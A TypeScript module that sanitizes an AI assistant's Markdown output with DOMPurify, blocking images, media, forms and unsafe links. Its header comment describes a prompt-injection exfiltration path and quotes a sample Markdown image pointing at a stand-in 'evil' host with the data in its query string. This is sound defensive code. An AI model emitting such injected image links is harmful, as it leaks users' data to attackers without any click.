import DOMPurify from 'dompurify';
import { marked } from 'marked';

/**
 * Renders assistant (Jeeves) Markdown to safe HTML.
 *
 * Assistant output is model-generated and may echo prompt-injected text from
 * user content, so it gets a stricter policy than SafeHtml:
 * - No images, media, frames, forms, SVG/MathML or styles. The CSP allows
 *   `img-src https:`, so an injected `![](https://evil/?d=...)` would leak
 *   data with zero clicks. Images are never rendered here.
 * - Links only for http(s)/mailto/relative URLs, always opened in a new tab
 *   with rel="noopener noreferrer".
 * - `[area.task]` guide citations become chips.
 *
 * Uses its own DOMPurify instance so the link hook never affects SafeHtml.
 */

const citeRe = /\[([a-z0-9-]+\.[a-z0-9-]+)\]/g;

const FORBID_TAGS = [
	'img',
	'picture',
	'source',
	'video',
	'audio',
	'track',
	'iframe',
	'frame',
	'object',
	'embed',
	'form',
	'input',
	'button',
	'textarea',
	'select',
	'style',
	'link',
	'meta',
	'base',
	'svg',
	'math',
];
const FORBID_ATTR = ['style', 'src', 'srcset', 'poster', 'background', 'formaction'];

let purifier: ReturnType<typeof DOMPurify> | null = null;

function getPurifier(): ReturnType<typeof DOMPurify> {
	if (purifier) return purifier;
	purifier = DOMPurify(window);
	purifier.addHook('afterSanitizeAttributes', (node) => {
		if (node.tagName === 'A') {
			const href = node.getAttribute('href') ?? '';
			if (!/^(https?:|mailto:|\/|#)/i.test(href)) {
				node.removeAttribute('href');
			} else {
				node.setAttribute('target', '_blank');
				node.setAttribute('rel', 'noopener noreferrer');
			}
		}
	});
	return purifier;
}

export function renderAssistantMarkdown(markdown: string): string {
	// The capture group only allows [a-z0-9.-], so the inserted HTML is safe.
	const withCites = markdown.replace(citeRe, '<span class="assistant-cite" data-cite="$1">$1</span>');
	const html = marked.parse(withCites, { async: false, gfm: true }) as string;
	return getPurifier().sanitize(html, {
		FORBID_TAGS,
		FORBID_ATTR,
		ALLOW_DATA_ATTR: true,
	});
}
